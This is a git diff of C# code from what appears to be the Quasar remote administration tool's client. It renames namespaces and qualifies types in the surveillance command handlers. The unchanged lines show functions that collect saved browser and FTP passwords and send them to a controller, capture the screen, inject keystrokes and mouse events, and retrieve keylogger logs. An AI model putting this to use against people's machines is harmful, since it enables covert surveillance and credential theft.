@@ -1,28 +1,27 @@
-﻿using Quasar.Common.Enums;
-using Quasar.Common.IO;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
-using Quasar.Common.Video;
-using Quasar.Common.Video.Codecs;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
 using System.Windows.Forms;
-using xClient.Core.Helper;
-using xClient.Core.Networking;
-using xClient.Core.Recovery.Browsers;
-using xClient.Core.Recovery.FtpClients;
-using xClient.Core.Utilities;
+using Quasar.Client.Core.Helper;
+using Quasar.Client.Core.Recovery.Browsers;
+using Quasar.Client.Core.Recovery.FtpClients;
+using Quasar.Client.Core.Utilities;
+using Quasar.Common.Enums;
+using Quasar.Common.IO;
+using Quasar.Common.Messages;
+using Quasar.Common.Models;
+using Quasar.Common.Video;
+using Quasar.Common.Video.Codecs;
 
-namespace xClient.Core.Commands
+namespace Quasar.Client.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
     public static partial class CommandHandler
     {
-        public static void HandleGetPasswords(GetPasswords packet, Client client)
+        public static void HandleGetPasswords(GetPasswords packet, Networking.Client client)
         {
             List<RecoveredAccount> recovered = new List<RecoveredAccount>();
 
@@ -37,7 +36,7 @@ namespace xClient.Core.Commands
             client.Send(new GetPasswordsResponse {RecoveredAccounts = recovered});
         }
 
-        public static void HandleGetDesktop(GetDesktop command, Client client)
+        public static void HandleGetDesktop(GetDesktop command, Networking.Client client)
         {
             // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
             var monitorBounds = ScreenHelper.GetBounds((command.DisplayIndex));
@@ -113,7 +112,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoMouseEvent(DoMouseEvent command, Client client)
+        public static void HandleDoMouseEvent(DoMouseEvent command, Networking.Client client)
         {
             try
             {
@@ -161,7 +160,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoKeyboardEvent(DoKeyboardEvent command, Client client)
+        public static void HandleDoKeyboardEvent(DoKeyboardEvent command, Networking.Client client)
         {
             if (NativeMethodsHelper.IsScreensaverActive())
                 NativeMethodsHelper.DisableScreensaver();
@@ -169,7 +168,7 @@ namespace xClient.Core.Commands
             NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
         }
 
-        public static void HandleGetMonitors(GetMonitors command, Client client)
+        public static void HandleGetMonitors(GetMonitors command, Networking.Client client)
         {
             if (Screen.AllScreens.Length > 0)
             {
@@ -177,7 +176,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleGetKeyloggerLogs(GetKeyloggerLogs command, Client client)
+        public static void HandleGetKeyloggerLogs(GetKeyloggerLogs command, Networking.Client client)
         {
             new Thread(() =>
             {
